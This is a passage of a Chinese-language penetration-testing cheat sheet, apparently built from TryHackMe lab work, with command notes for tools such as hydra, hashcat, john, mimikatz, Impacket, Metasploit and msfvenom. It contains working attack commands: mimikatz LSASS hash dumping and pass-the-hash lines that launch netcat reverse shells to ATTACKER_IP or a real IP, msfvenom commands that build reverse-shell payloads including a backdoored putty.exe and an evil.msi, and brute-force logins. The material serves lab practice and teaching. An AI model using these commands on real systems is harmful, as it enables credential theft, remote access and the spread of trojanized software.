class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ftp 10.10.229.201<br><br>anonymous#匿名登录用户名<br></code></pre></td></tr></table></figure><p>常用操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span> -lha</span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">pwd</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">dir</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">cd</span> /path/to/directory  <span class="hljs-comment"># 进入目标目录</span></span> <br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">put local_file         <span class="hljs-comment"># 上传本地文件到服务器</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">get remote_file        <span class="hljs-comment"># 下载服务器文件到本地</span></span> <br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">mput *.txt             <span class="hljs-comment"># 批量上传（通配符）</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">mget *.pdf             <span class="hljs-comment"># 批量下载</span></span> <br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash"><span class="hljs-built_in">bye</span>      <span class="hljs-comment"># 或 exit、quit</span></span> <br></code></pre></td></tr></table></figure><p>设置传输模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">binary    <span class="hljs-comment"># 二进制模式（适用于图片、压缩包等）</span></span><br><span class="hljs-meta prompt_">ftp&gt; </span><span class="language-bash">ascii     <span class="hljs-comment"># 文本模式（适用于纯文本文件）</span></span><br></code></pre></td></tr></table></figure><h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a><a href="https://github.com/OJ/gobuster">gobuster</a></h2><p>目录扫描/子域名扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">目录扫描</span><br>gobuster dir -u http://10.10.147.99/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>gobuster dir -u http://cyprusbank.thm/ -w /usr/share/wordlists/dirb/big.txt<br>gobuster dir -u http://10.10.80.155/ -w /usr/share/wordlists/dirb/big.txt -b 403#忽略403<br><br>gobuster vhost -k --domain creative.thm --append-domain -u http://10.10.54.137 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100# 子域名爆破<br><br>gobuster fuzz -u &quot;http://beta.creative.thm/&quot; -m POST \<br>-B &#x27;url=http://127.0.0.1:FUZZ&#x27; -w ports.txt \<br>-H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \<br>--exclude-length 13 -t 20# 通过ssrf探测内部可访问端口<br></code></pre></td></tr></table></figure><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hashcat -a 0 -m 0 64e39c60d69afe351b48472307add2c5 /usr/share/wordlists/rockyou.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-a 0设置攻击模式为字典攻击</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-m 0设置破解 MD5 散列的哈希模式</span><br></code></pre></td></tr></table></figure><h2 id="hexeditor"><a href="#hexeditor" class="headerlink" title="hexeditor"></a>hexeditor</h2><p>二进制编辑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexeditor -b oneforall.jpg# 打开编辑页面,暂未找到如何覆盖式粘贴<br></code></pre></td></tr></table></figure><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V<br>hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x<br><span class="hljs-meta prompt_"> # </span><span class="language-bash">-l 用户名,大写指定字典文件，小写指定字符串</span><br><span class="hljs-meta prompt_"> # </span><span class="language-bash">-P 密码，同上</span><br><span class="hljs-meta prompt_"> # </span><span class="language-bash">-v 详细模式</span><br><br></code></pre></td></tr></table></figure><p>历史：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.147.99 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:failed&quot; -V<br></code></pre></td></tr></table></figure><p>Patrick</p><p>karen</p><p>Martin</p><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 使用 PtH 通过 psexec 连接</span><br>psexec.py -hashes NTLM_HASH DOMAIN/MyUser<span class="hljs-symbol">@VICTIM_IP</span><br></code></pre></td></tr></table></figure><h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">john --wordlist=clinic.txt --rules=KoreLogic --stdout &gt;&gt; passwords.txt#基于规则生成密码字典<br><br>keepass2john dataset.kdbx &gt; dataset.john<br>john dataset.john<br></code></pre></td></tr></table></figure><p>将各种文件转换到john格式的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">用法示例</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">keepass2john dataset.kdbx &gt; dataset.john</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">john dataset.john</span><br>1password2john<br>7z2john<br>aruba2john<br>applenotes2john<br>adxcsouf2john<br>androidbackup2john<br>apex2john<br>ansible2john<br>aix2john<br>andotp2john<br>aem2john<br>atmail2john<br>androidfde2john<br>axcrypt2john<br>bitlocker2john<br>bitcoin2john<br>bitshares2john<br>blockchain2john<br>bestcrypt2john<br>bks2john<br>bitwarden2john<br>cracf2john<br>cisco2john<br>ccache2john<br>dmg2john<br>dmg2john<br>diskcryptor2john<br>DPAPImk2john<br>dashlane2john<br>deepsound2john<br>electrum2john<br>ecryptfs2john<br>ejabberd2john<br>ethereum2john<br>enpass2john<br>encfs2john<br>filezilla2john<br>gpg2john<br>geli2john<br>hccap2john<br>hccapx2john<br>htdigest2john<br>iwork2john<br>itunes_backup2john<br>ibmiscanner2john<br>ikescan2john<br>keepass2john<br>keystore2john<br>keychain2john<br>keyring2john<br>kwallet2john<br>kirbi2john<br>krb2john<br>kdcdump2john<br>known_hosts2john<br>lotus2john<br>ldif2john<br>luks2john<br>libreoffice2john<br>lion2john<br>lastpass2john<br>mcafee_epo2john<br>monero2john<br>mozilla2john<br>money2john<br>multibit2john<br>mosquitto2john<br>mac2john<br>neo2john<br>openssl2john<br>openbsd_softraid2john<br>office2john<br>putty2john<br>pfx2john<br>pcap2john<br>prosody2john<br>pgpsda2john<br>pgpdisk2john<br>ps_token2john<br>padlock2john<br>pem2john<br>pwsafe2john<br>pgpwde2john<br>pdf2john<br>pse2john<br>rar2john<br>racf2john<br>restic2john<br>radius2john<br>signal2john<br>sipdump2john<br>sspr2john<br>ssh2john<br>strip2john<br>sap2john<br>sense2john<br>staroffice2john<br>truecrypt2john<br>telegram2john<br>tezos2john<br>uaf2john<br>vncpcap2john<br>vmx2john<br>vdi2john<br>wpapcap2john<br>zip2john<br>zed2john<br></code></pre></td></tr></table></figure><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs shell">John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64 位 x86_64 AVX AC]<br>版权所有 (c) 1996-2021 Solar Designer 及其他<br>主页：https://www.openwall.com/john/<br><br>用法：john [OPTIONS] [PASSWORD-FILES]<br><br>--help 打印使用摘要<br>--single[=SECTION[,..]] “单一破解”模式，使用默认或命名规则<br>--single=:rule[,..] 同上，使用“立即破解”规则<br>--single-seed=WORD[,WORD] 在单一模式下为所有盐添加静态种子词<br>--single-wordlist=FILE包含静态种子词/词素的*简短*单词表<br>--single-user-seed=FILE 包含每个用户名的种子词表（用户名:密码[s] 格式）<br>--single-pair-max=N 覆盖最大值。生成的单词对数量 (6)<br>--no-single-pair 禁用单个单词对生成<br>--[no-]single-retest-guess 覆盖 SingleRetestGuess 的配置<br>--wordlist[=FILE] --stdin 单词列表模式，从 FILE 或 stdin 读取单词<br>--pipe 类似 --stdin，但批量读取，并允许规则<br>--rules[=SECTION[,..]] 启用单词重排规则（用于单词列表或 PRINCE 模式），使用默认或命名规则<br>--rules=:rule[;..]] 同上，使用“立即生效”规则<br>--rules-stack=SECTION[,..] 堆叠规则，应用于常规规则之后或不支持规则的模式<br>--rules-stack=:rule[;..] 同上，使用“立即生效”规则<br>--rules-skip-nop 跳过任何 NOP &quot;:&quot; 规则（您已运行但未使用规则）<br>--loopback[=FILE] 与 --wordlist 类似，但从 .pot 文件中提取单词<br>--mem-file-size=SIZE 单词列表预加载的大小阈值（默认 2048 MB）<br>--dupe-suppression 抑制单词列表中的所有重复项（并强制预加载）<br>--incremental[=MODE] “增量”模式 [使用 MODE 部分]<br>--incremental-charcount=N 增量模式下覆盖 CharCount<br>--external=MODE 外部模式或单词过滤器<br>--mask[=MASK] 使用 MASK 的掩码模式（或 john.conf 中的默认值）<br>--markov[=OPTIONS] “马尔可夫”模式（参见 doc/MARKOV）<br>--mkv-stats=FILE “马尔可夫”统计文件<br>--prince[=FILE] PRINCE 模式，从 FILE 读取单词<br>--prince-loopback[=FILE] 从 .pot 文件中提取单词文件<br>--prince-elem-cnt-min=N 每条链的最小元素数 (1)<br>--prince-elem-cnt-max=[-]N 每条链的最大元素数（负 N 相对于单词长度）(8)<br>--prince-skip=N 初始跳过次数<br>--prince-limit=N 生成的候选字符数限制<br>--prince-wl-dist-len 计算单词表的长度分布<br>--prince-wl-max=N 仅从输入单词表中加载 N 个单词<br>--prince-case-permute 首字母大小写置换<br>--prince-mmap 内存映射文件（大小写置换不可用）<br>--prince-keyspace 仅显示将生成的总键空间<br>（忽略跳过次数和限制）<br>--subsets[=CHARSET] “子集”模式（参见 doc/SUBSETS）<br>--subsets-required=N “子集”字符集的前 N ​​个字符是<br>“必需集”<br>--subsets-min-diff=N 子集中的最小唯一字符数<br>--subsets-max-diff=[-]N 子集中的最大唯一字符数（负 N 相对于字长）<br>--subsets-prefer-short 优先选择较短的候选字符，而不是较小的子集<br>--subsets-prefer-small 优先选择较小的子集，而不是较短的候选字符<br>--make-charset=FILE 创建一个字符集，FILE 将被覆盖<br>--stdout[=LENGTH] 仅输出候选密码 [截取长度]<br>--session=NAME 为新会话指定 NAME<br>--status[=NAME] 打印会话状态 [名为 NAME]<br>--restore[=NAME] 恢复中断的会话 [名为 NAME]<br>--[no-]crack-status 每当密码被破解时发出状态行<br>--progress-every=N 每 N 秒发出一次状态行<br>--show[=left] 显示已破解密码 [如果 =left，则表示未破解]<br>--show=formats 显示文件中哈希值的信息 (JSON)<br>--show=invalid 显示对所选格式无效的行<br>--test[=TIME] 每次运行测试和基准测试，每次持续 TIME 秒<br>（如果 TIME 明确为 0，则测试不进行基准测试）<br>--stress-test[=TIME] 永久循环自检<br>--test-full=LEVEL 运行更彻底的自检<br>--no-mask 与 --test 一起使用，用于不带 mask 的备用基准测试<br>--skip-self-tests 跳过自检<br>--users=[-]LOGIN|UID[,..] 仅加载此（这些）用户<br>--groups=[-]GID[,..] 仅加载不属于此（这些）组的用户<br>--shells=[-]SHELL[,..] 仅加载使用此（这些）shell 的用户<br>--salts=[-]COUNT[:MAX] 加载包含 COUNT 个哈希值的 salt，或者<br>--salts=#M[-N] 加载 M 个（到 N 个）最多的 salt<br>--costs=[-]C[:M][,...] 加载包含成本值 Cn 的 salt [到 Mn]。有关<br>可调成本参数，请参阅 doc/OPTIONS<br>--fork=N 分支 N 个进程<br>--node=MIN[-MAX]/TOTAL 此节点的数量范围超出 TOTAL 数量<br>--save-memory=LEVEL 启用内存节省，级别 1..3<br>--log-stderr 记录到屏幕而不是文件<br>--verbosity=N 更改详细程度（1-5 或 6 用于调试，默认 3）<br>--no-log 禁用创建和写入 john.log 文件<br>--bare-always-valid=Y 将裸哈希视为有效（Y/N）<br>--catch-up=NAME 追赶现有（已暂停）会话 NAME<br>--config=FILE 使用 FILE 而不是 john.conf 或 john.ini<br>--encoding=NAME 输入编码（例如 UTF-8、ISO-8859-1）。另请参阅<br>doc/ENCODINGS。<br>--input-encoding=NAME 输入编码（--encoding 的别名）<br>--internal-codepage=NAME 规则/掩码中使用的代码页（参见 doc/ENCODINGS）<br>--target-encoding=NAME 输出编码（用于 format）<br>--force-tty 设置终端读取按键，即使我们不是前台进程<br>--field-separator-char=C 在输入和 pot 文件中使用 &#x27;C&#x27; 代替 &#x27;:&#x27;<br>--[no-]keep-guessing 尝试查找明文冲突<br>--list=WHAT 列出功能，参见 --list=help 或 doc/OPTIONS<br>--length=N --min-len=N --max-len=N 的快捷方式<br>--min-length=N 请求最小候选长度（以字节为单位）<br>--max-length=N 请求最大候选长度（以字节为单位）<br>--max-candidates=[-]N 尝试了这么多候选字符后优雅退出。<br>（如果为负数，则每次破解时重置计数）<br>--max-run-time=[-]N 在指定秒数后优雅退出（如果为负数，则每次破解时重置计时器）<br>--mkpc=N 请求降低每次加密的最大密钥数量<br>--no-loader-dupecheck 加载哈希值时禁用重复检查<br>--pot=NAME 使用的 Pot 文件<br>--regen-lost-salts=N 暴力破解未知盐值（参见 doc/OPTIONS）<br>--reject-printable 拒绝可打印的二进制文件<br>--tune=HOW 调整选项 (auto/report/N)<br>--subformat=FORMAT 为 --format=crypt 选择基准格式<br>--format=[NAME|CLASS][,..] 强制使用 NAME 类型的哈希值。支持的格式可以通过 --list=formats 和 --list=subformats 查看。<br>有关更高级的格式选择，包括使用类和通配符，另请参阅 doc/OPTIONS。<br></code></pre></td></tr></table></figure><h2 id="keepassxc-cli"><a href="#keepassxc-cli" class="headerlink" title="keepassxc-cli"></a>keepassxc-cli</h2><p>KeePass数据库命令行管理工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">keepassxc-cli open dataset.kdbx#打开dataset.kdbx数据库文件，可能要输入密码<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">内部操作</span><br>dataset.kdbx&gt; ls# 列出当前路径下的条目<br>dataset.kdbx&gt; ls -R# 递归列出所有子目录中的条目<br>dataset.kdbx&gt; show --all /user:password# 查看指定条目的详细信息，显示条目所有字段（包括 UUID、备注等隐藏属性）<br>dataset.kdbx&gt; show --all --show-protected /user:password # 查看指定条目的详细信息，显示条目所有字段（包括 UUID、备注等隐藏属性），强制显示被保护字段<br></code></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>凭证提取工具</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 提升进程权限</span><br>mimikatz <span class="hljs-comment"># privilege::debug</span><br>mimikatz <span class="hljs-comment"># token::elevate</span><br><br><span class="hljs-comment"># 从本地 SAM 提取 NTLM 哈希，仅能获取机器上本地用户的哈希</span><br>mimikatz <span class="hljs-comment"># lsadump::sam  </span><br><br><span class="hljs-comment"># 从 LSASS 内存中提取 NTLM 哈希，可提取任何本地用户以及最近登录到该机器的任何域用户的 NTLM 哈希</span><br>mimikatz <span class="hljs-comment"># sekurlsa::msv </span><br><br><span class="hljs-comment"># pth攻击，注意使用了token::revert恢复原始令牌权限,因为system无法进行pth</span><br>mimikatz <span class="hljs-comment"># token::revert </span><br>mimikatz <span class="hljs-comment"># sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span><br><br><span class="hljs-comment"># 从 LSASS 进程中提取 Kerberos 票据，并将其导出为文件</span><br>mimikatz <span class="hljs-comment"># sekurlsa::tickets /export</span><br><br><span class="hljs-comment"># ptt票据传递</span><br>mimikatz <span class="hljs-comment"># kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi</span><br><br><span class="hljs-comment"># 从内存中获取 Kerberos 加密密钥</span><br>mimikatz <span class="hljs-comment"># sekurlsa::ekeys</span><br><br><span class="hljs-comment"># ptk密钥传递</span><br>mimikatz <span class="hljs-comment"># sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br><br>sekurlsa::pth /user:t1_toby.beck /domain:ZA.TRYHACKME.COM /aes256:<span class="hljs-number">6</span>a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.77.76 5555&quot;</span><br></code></pre></td></tr></table></figure><h2 id="mosquitto"><a href="#mosquitto" class="headerlink" title="mosquitto"></a>mosquitto</h2><p>Mosquitto 是一个开源的消息代理，它实现了 MQTT（消息队列遥测传输）协议，该协议在物联网（IoT）应用中广泛使用，用于轻量级和高效的消息传递。</p><p>MQTT 代表消息队列遥测传输。它是一种轻量级消息协议，适用于客户端需要小代码占用和连接到不可靠网络或带宽资源有限网络的情况。</p><p><strong>mosquitto_sub</strong>：订阅</p><p><strong>mosquitto_pub</strong>：发送</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">这里两个主题是对应的</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">订阅</span><br>mosquitto_sub -h 10.10.153.136 -t &quot;#&quot; -v# 订阅所有主题并接收详细信息，从这里拿到两个对应的主题<br>mosquitto_sub -h 10.10.153.136 -t &quot;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&quot;# 订阅指定主题<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">发送</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;arg&quot;</span>: <span class="hljs-string">&quot;ls&quot;</span>&#125;</span><br>mosquitto_pub -h 10.10.153.136 -t &quot;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&quot; -m eyJpZCI6ICIxIiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImxzIn0=<br><br>-h [IP] 指定您想要连接的 MQTT 代理的主机名或 IP 地址。将 [IP] 替换为代理的实际 IP 地址或主机名。<br>-t &quot;#&quot; 订阅 # 主题，这是一个通配符，匹配所有主题。这意味着您将接收到发布到任何主题的消息。<br>-v 启用详细输出，包括输出中的主题和消息有效负载。没有此标志，仅显示消息有效负载。<br>-m 发送消息<br></code></pre></td></tr></table></figure><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">search CVE-2013-2251<br>use 1<br>set TARGETURI /struts2-blank/example/HelloWorld.action<br>set RHOSTS www.rbq.com<br>set RPORT 80<br><br>use exploit/multi/handler # 接收反向shell<br><br>background# 将会话放在后台<br>sessions -l  # (查看会话)<br>sessions -i 2   # 选择会话<br>sessions -k 2   # 结束会话<br><br>use post/multi/recon/local_exploit_suggester # 后渗透模块<br></code></pre></td></tr></table></figure><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe<br><br>msfvenom -p windows/x64/meterpreter/reverse_tcp LH0ST=10.2.26.216 LPORT=4444 -f exe-o reverse.exe # 创建一个分阶段的有效载荷<br>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.2.26.216 LPORT=4444 -f elf &gt; reverse.elf# 创建一个分阶段的有效载荷<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建msi马</span><br>msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi<br></code></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">[v1.10-50]<br>连接到某个位置：nc [-options] 主机名 端口 [端口] ...<br>监听入站：nc -l -p 端口 [-options] [主机名] [端口]<br>选项：<br>-c shell 命令为 `-e&#x27;；使用 /bin/sh 执行 [危险！！]<br>-e filename 